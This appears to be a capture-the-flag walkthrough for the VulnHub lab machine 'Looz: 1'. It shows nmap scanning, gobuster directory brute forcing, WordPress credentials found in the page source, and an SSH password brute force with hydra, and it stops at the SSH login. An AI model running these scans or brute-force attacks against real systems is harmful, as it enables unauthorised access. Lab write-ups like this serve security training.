:::::::::::::: page
# Looz: 1 {#looz-1 .title}

\

## 

## Looz: 1

- **[Looz: 1 ]{style="color:#060f94;"}** :-

<!-- -->

- Download the machine : <https://www.vulnhub.com/entry/looz-1,732/>

![](images/767-1.png)

- Now unzip the file .
- Open ova file .
- Then click finish .
- Start the machine .

1.  [Network Scanning]{style="color:#f6d32d;"} :

- Find the machine IP :

::: codebox
    nmap -sn 192.168.2.0/24
:::

![](images/767-2.png)

- Run nmap master command :

::: codebox
    nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.102
:::

![](images/767-3.png)

- Find available port in the machine ( Optional ) :

::: codebox
    nmap -v -p- 192.168.2.102
:::

- 

::: codebox
    nmap -sC -sV -A 192.168.2.102
:::

- This command runs an aggressive scan and uses the http-enum script to
  identify potential CGI directories .

::: codebox
    nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.102
:::

1.  [Web Enumeration]{style="color:#f6d32d;"} :

- IP visit in browser : <http://192.168.2.102>
- Directory Brute force on port 8081 :

::: codebox
    gobuster dir -u http://192.168.2.102:8081 -w /usr/share/wordlists/dirb/common.txt
:::

![](images/767-4.png)

- Visit the /wp-admin the redirect the page :
  <http://192.168.2.102:8081/wp-admin/>

<!-- -->

- Entry in host file :

::: codebox
    nano /etc/hosts
:::

- 

::: codebox
    192.168.2.102 wp.looz.com
:::

![](images/767-5.png)

- Then refresh the page :

![](images/767-6.png)

- Now go to 80 port url and inpect the code for hidden username and
  password :

![](images/767-7.png)

::: codebox
    Username : john
    Password : y0uC@n'tbr3akIT
:::

- Enter username and password then you login the page :

![](images/767-8.png)

- Login successful : <http://wp.looz.com/wp-admin/>

![](images/767-9.png)

- Go to user section and I found there was another user that had
  administrator role :

![](images/767-10.png)

- Used hydra to brute force the SSH login :

::: codebox
    hydra -l gandalf -P /opt/rockyou.txt ssh://192.168.2.102 -t 16
:::

![](images/767-11.png) It take something 1 hour to find password .

- Now login with ssh connection :

::: codebox
    ssh gandalf@192.168.2.102
:::

![](images/767-12.png) ![](images/767-13.png)
::::::::::::::
